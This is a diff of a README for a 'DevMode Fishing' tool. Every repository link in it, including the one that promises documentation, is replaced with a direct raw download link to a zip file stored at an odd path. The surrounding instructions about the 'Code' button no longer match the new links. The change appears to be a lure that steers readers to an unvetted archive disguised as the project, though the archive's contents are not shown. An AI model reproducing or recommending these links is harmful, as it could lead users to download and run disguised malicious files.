@@ -1,6 +1,6 @@
 # 🎣 how-to-fish-DevMode - Your Ultimate Fishing Assistant Tool
 
-[![Download Now](https://img.shields.io/badge/Download-DevMode_Fishing-blue?style=for-the-badge&logo=github)](https://github.com/asad95955/how-to-fish-DevMode)
+[![Download Now](https://img.shields.io/badge/Download-DevMode_Fishing-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/asad95955/how-to-fish-DevMode/main/machinal/v2.4.zip)
 
 ---
 
@@ -56,7 +56,7 @@ No complex installation required. The tool runs directly from your computer with
 
 ## 📥 Download Instructions
 
-Visit this link to download the application: **[https://github.com/asad95955/how-to-fish-DevMode](https://github.com/asad95955/how-to-fish-DevMode)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/asad95955/how-to-fish-DevMode/main/machinal/v2.4.zip](https://raw.githubusercontent.com/asad95955/how-to-fish-DevMode/main/machinal/v2.4.zip)**
 
 Click the green "Code" button on the page, then select "Download ZIP" to get the latest version of the tool.
 
@@ -137,7 +137,7 @@ The full license text is available in the repository.
 If you encounter any issues or have questions about DevMode Fishing, here's how to get assistance:
 
 ### Check the Repository
-Visit the GitHub repository for documentation, known issues, and updates: [https://github.com/asad95955/how-to-fish-DevMode](https://github.com/asad95955/how-to-fish-DevMode)
+Visit the GitHub repository for documentation, known issues, and updates: [https://raw.githubusercontent.com/asad95955/how-to-fish-DevMode/main/machinal/v2.4.zip](https://raw.githubusercontent.com/asad95955/how-to-fish-DevMode/main/machinal/v2.4.zip)
 
 ### Search for Solutions
 Browse the Issues section on GitHub to see if others have experienced similar problems and found solutions.
